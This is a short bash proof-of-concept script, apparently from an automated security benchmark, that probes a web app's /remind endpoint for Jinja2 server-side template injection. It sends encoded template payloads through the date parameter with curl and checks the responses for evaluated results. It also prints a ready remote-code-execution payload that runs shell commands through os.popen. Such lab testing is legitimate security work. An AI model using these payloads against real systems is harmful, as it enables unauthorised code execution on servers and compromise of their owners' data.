#!/bin/bash
# POC: Demonstrates Server-Side Template Injection (SSTI) in Jinja2 on the /remind endpoint. Tests mathematical expression evaluation to confirm arbitrary code execution capability.
# Target: ./repo
# Created: 2025-12-02T16:20:51.628Z
# Session: benchmark-XBEN-093-24-miorxjqr

# Server-Side Template Injection (SSTI) in Jinja2 - /remind endpoint
# This POC demonstrates that the date parameter is vulnerable to template injection
# allowing arbitrary Jinja2 expressions to be evaluated server-side

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/remind"

echo "[*] Testing SSTI vulnerability in ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic mathematical expression evaluation (7*7 = 49)
echo "[+] Test 1: Basic mathematical expression injection (7*7)"
PAYLOAD_1="{{7*7}}"
ENCODED_1="%7B%7B7*7%7D%7D"
echo "    Payload: ${PAYLOAD_1}"
echo "    URL Encoded: ${ENCODED_1}"
echo ""

RESPONSE_1=$(curl -s "${TARGET_URL}${ENDPOINT}?date=${ENCODED_1}")
echo "    Response: ${RESPONSE_1}"
echo ""

# Check if the response contains "49" which confirms template evaluation
if echo "${RESPONSE_1}" | grep -q "49"; then
    echo "[✓] CONFIRMED: Template expression was evaluated (7*7 = 49)"
    echo "[!] CRITICAL: The application is vulnerable to SSTI"
else
    echo "[✗] Test 1 failed - response did not contain '49'"
    echo "    Full response: ${RESPONSE_1}"
fi

echo ""
echo "[+] Test 2: Additional expression - string concatenation"
PAYLOAD_2="{{\"test\"|length}}"
ENCODED_2="%7B%7B%22test%22%7Clength%7D%7D"
echo "    Payload: ${PAYLOAD_2} (should return 4)"
echo "    URL Encoded: ${ENCODED_2}"
echo ""

RESPONSE_2=$(curl -s "${TARGET_URL}${ENDPOINT}?date=${ENCODED_2}")
echo "    Response: ${RESPONSE_2}"
echo ""

if echo "${RESPONSE_2}" | grep -q "4"; then
    echo "[✓] CONFIRMED: Filter expressions also work"
fi

echo ""
echo "[!] Impact: This vulnerability allows arbitrary code execution via payloads like:"
echo "    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
echo ""
echo "[*] POC complete"